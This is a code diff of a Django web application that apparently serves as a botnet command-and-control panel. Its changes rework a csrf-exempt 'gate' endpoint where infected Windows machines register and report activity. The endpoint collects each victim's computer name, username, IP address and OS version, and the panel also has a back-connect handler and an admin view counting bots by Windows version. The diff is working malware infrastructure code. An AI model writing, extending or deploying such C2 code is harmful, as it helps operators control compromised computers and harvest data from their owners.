@@ -1,11 +1,13 @@
+import pytz
 from django.shortcuts import HttpResponse, render
 from django.http import JsonResponse
 from django.contrib.auth.models import User
 from django.contrib.auth import login
 from django.views.decorators.csrf import csrf_exempt
-from .bot_pb2 import BotMsg, BackConnectMsg
+from .bot_pb2 import BotMsg, BackConnectMsg, PanelMsg
 from .models import Bot
 import datetime
+import struct
 
 # from django.core.paginator import Paginator
 
@@ -95,6 +97,7 @@ class AdminPanel:
         in_day = self.sub.get_by_day(bots)
         in_month = self.sub.get_by_month(bots)
         total = bots.count()
+        print([counts_is_win7, counts_is_winxp, counts_is_win8, counts_is_win10, counts_is_win11])
 
         if request.user.is_superuser:
             return render(request, 'main/main.html', {'win_version': [counts_is_win7, counts_is_winxp, counts_is_win8,
@@ -106,7 +109,15 @@ class AdminPanel:
 
     @staticmethod
     def get_table_page(request) -> render:
-        bots = Bot.objects.all()
+        tz = pytz.UTC
+
+        bots = []
+
+        for bot in Bot.objects.all():
+            if (datetime.datetime.now(tz=tz) - bot.date).seconds // 60 > 3:
+                bot.is_online = False
+            bots.append(bot)
+
         return render(request, 'main/table.html', {'bots': bots})
 
     @staticmethod
@@ -127,6 +138,16 @@ class AdminPanel:
 class Handlers:
     def __init__(self, subsidiary):
         self.sub = subsidiary
+
+    def test(self, request):
+        for bot in Bot.objects.all():
+            _2 = bot.date
+            print(_2, bot.uid)
+
+        tz = pytz.UTC
+        _1 = datetime.datetime.now(tz=tz)
+        print((_1 - _2).seconds // 60)
+        return HttpResponse('')
 
     def back_connect(self, request):
         try:
@@ -152,41 +173,65 @@ class Handlers:
     @csrf_exempt
     def gate(self, request) -> HttpResponse:
 
-        msg_type = BotMsg()
-        msg_type.ParseFromString(request.body)
+        msg_type = struct.unpack('=I', request.body[:4])[0]
 
-        if msg_type.type == 1:
-            pass
+        if msg_type == 1:
+            try:
+                bot = BotMsg.RegisterBot()
+                bot.ParseFromString(request.body[4:])
 
-        bot = BotMsg()
-        bot.ParseFromString(request.body)
+                ip = self.sub.get_bot_ip(request)
 
-        ip = self.sub.get_bot_ip(request)
+                uid = bot.uid.decode('utf-16-le')
+                computername = bot.computername.decode('utf-16-le')
+                username = bot.username.decode('utf-16-le')
+                os_major = bot.os_major
+                os_minor = bot.os_minor
+                is_x64 = bot.is_x64
+                is_server = bot.is_server
 
-        uid = bot.uid.decode('utf-16-le')
-        computername = bot.computername.decode('utf-16-le')
-        username = bot.username.decode('utf-16-le')
-        os_major = bot.os_major
-        os_minor = bot.os_minor
-        is_x64 = bot.is_x64
-        is_server = bot.is_server
+                try:
+                    _bot = Bot.objects.get(uid=uid)
+                except Exception as e:
+                    print(e)
+                    _bot = Bot(ip=ip, uid=uid, computername=computername, username=username, is_x64=is_x64, is_server=is_server)
 
-        try:
-            _bot = Bot.objects.get(uid=uid)
-        except Exception as e:
-            print(e)
-            _bot = Bot(ip=ip, uid=uid, computername=computername, username=username, is_x64=is_x64, is_server=is_server)
+                if os_major == 10 and os_minor == 0:
+                    _bot.is_win10 = True
+                elif os_major == 6 and os_minor == 1:
+                    _bot.is_win7 = True
+                elif os_major == 5 and os_minor == 1:
+                    _bot.is_winxp = True
 
-        if os_major == 10 and os_minor == 0:
-            _bot.is_win10 = True
-        elif os_major == 6 and os_minor == 1:
-            _bot.is_win7 = True
-        elif os_major == 5 and os_minor == 1:
-            _bot.is_winxp = True
+                _bot.save()
 
-        _bot.save()
+                res = PanelMsg.RegistrationResult()
+                res.result = True
+                res.dummy = False
 
-        return HttpResponse('200')
+                return HttpResponse(res.SerializeToString())
+
+            except Exception as e:
+                print(e)
+
+                res = PanelMsg.RegistrationResult()
+                res.result = False
+                res.dummy = True
+
+                return HttpResponse(res.SerializeToString())
+
+        elif msg_type == 2:
+            ar = BotMsg.ActivityReport()
+            ar.ParseFromString(request.body[4:])
+            uid = ar.uid.decode('utf-16-le')
+            bot = Bot.objects.get(uid=uid)
+            bot.is_online = True
+            bot.save()
+            return HttpResponse('200')
+
+        elif msg_type == 3:
+            print(3)
+            return HttpResponse('200')
 
     @staticmethod
     def ban(request) -> HttpResponse:
